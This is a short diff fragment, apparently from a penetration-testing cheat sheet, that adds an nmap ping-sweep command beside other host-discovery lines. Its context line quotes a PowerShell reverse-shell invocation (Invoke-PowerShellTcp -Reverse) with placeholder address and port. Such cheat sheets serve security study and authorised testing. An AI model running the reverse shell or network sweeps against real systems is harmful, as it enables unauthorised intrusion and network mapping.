@@ -2188,6 +2188,7 @@ Invoke-PowerShellTcp -Reverse -IPAddress IP_here -Port port_here
 ```bash
 # ping sweep
 nmap -sn IP_range
+nmap -sP IP_range
 nmap -sn -iL IP_list_file_here
 
 # sweep network
